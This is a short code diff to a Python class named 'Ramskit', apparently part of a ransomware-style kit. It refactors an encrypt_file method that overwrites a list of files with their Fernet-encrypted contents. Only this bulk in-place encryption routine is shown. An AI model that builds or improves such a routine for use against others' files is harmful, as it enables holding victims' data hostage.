@@ -35,11 +35,12 @@ class Ramskit:
 
     # FIXME: Fix encrypt method
     def encrypt_file(self, items, key) -> None:
+        fernet = Fernet(key)
+
         for item in items:
             with open(item, 'rb') as file:
                 data = file.read()
 
-            fernet = Fernet(key)
             encrypted = fernet.encrypt(data)
 
             with open(item, 'wb') as file:
